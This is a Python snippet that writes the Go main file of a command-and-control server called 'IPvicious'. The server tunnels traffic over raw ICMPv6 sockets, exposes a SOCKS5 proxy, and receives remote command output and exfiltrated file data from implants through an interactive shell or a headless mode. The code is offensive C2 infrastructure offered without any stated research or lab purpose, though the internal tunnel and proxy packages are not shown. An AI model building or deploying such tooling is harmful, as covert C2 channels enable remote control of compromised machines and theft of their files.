import os

content = '''\
//go:build linux

// cmd/server is the Linux C2 server entry point.
//
// Usage:
//   sudo ./c2server -socks 127.0.0.1:1080
//   sudo ./c2server -socks 127.0.0.1:1080 -no-repl   # headless / piped mode
//
// The server requires root (or CAP_NET_RAW) to open a raw ICMPv6 socket.
package main

import (
\t"flag"
\t"log"
\t"os"
\t"os/signal"
\t"syscall"

\t"ipvicious/internal/cli"
\t"ipvicious/internal/socks5"
\t"ipvicious/internal/tunnel"
)

// Compile-time defaults; overridable at link time.
var defaultSocksAddr = "127.0.0.1:1080"

func main() {
\tsocksAddr := flag.String("socks",    defaultSocksAddr, "SOCKS5 listen address")
\tnoRepl    := flag.Bool("no-repl",   false,            "disable interactive REPL (headless mode)")
\tflag.Parse()

\t// ── ICMPv6 tunnel server ────────────────────────────────────────────────
\ttun, err := tunnel.NewServerTunnel()
\tif err != nil {
\t\tlog.Fatalf("tunnel server init: %v", err)
\t}
\tdefer tun.Close()

\t// ── SOCKS5 proxy ────────────────────────────────────────────────────────
\tproxy := socks5.New(tun)
\tif err := proxy.Listen(*socksAddr); err != nil {
\t\tlog.Fatalf("socks5: %v", err)
\t}
\tdefer proxy.Close()

\t// ── Signal handler ──────────────────────────────────────────────────────
\tstop := make(chan struct{})
\tsig  := make(chan os.Signal, 1)
\tsignal.Notify(sig, syscall.SIGINT, syscall.SIGTERM)
\tgo func() { <-sig; close(stop) }()

\t// ── REPL or headless ────────────────────────────────────────────────────
\tif *noRepl {
\t\t// Headless mode: wire plain stdout callbacks (useful for logging/piping).
\t\ttun.OnCmdOut = func(_ uint32, _ uint32, output []byte) {
\t\t\tos.Stdout.Write(output)
\t\t}
\t\ttun.OnFileData = func(_ uint32, _ uint32, data []byte, last bool) {
\t\t\tif len(data) > 0 {
\t\t\t\tos.Stdout.Write(data)
\t\t\t}
\t\t\tif last {
\t\t\t\tlog.Printf("[server] file transfer complete")
\t\t\t}
\t\t}
\t\tlog.Printf("C2 server started (headless), SOCKS5 on %s", *socksAddr)
\t} else {
\t\t// Interactive REPL — wires its own callbacks and runs in a goroutine.
\t\trepl := cli.New(tun)
\t\tgo repl.Run(stop)
\t\tlog.Printf("C2 server started, SOCKS5 on %s  |  interactive shell active", *socksAddr)
\t}

\t// ── ICMPv6 receive loop (blocks) ────────────────────────────────────────
\ttun.Run(stop)
\tlog.Printf("C2 server stopped")
}
'''

with open('/Users/julien/Documents/IPvicious/cmd/server/main.go', 'w') as f:
    f.write(content)
print('written')
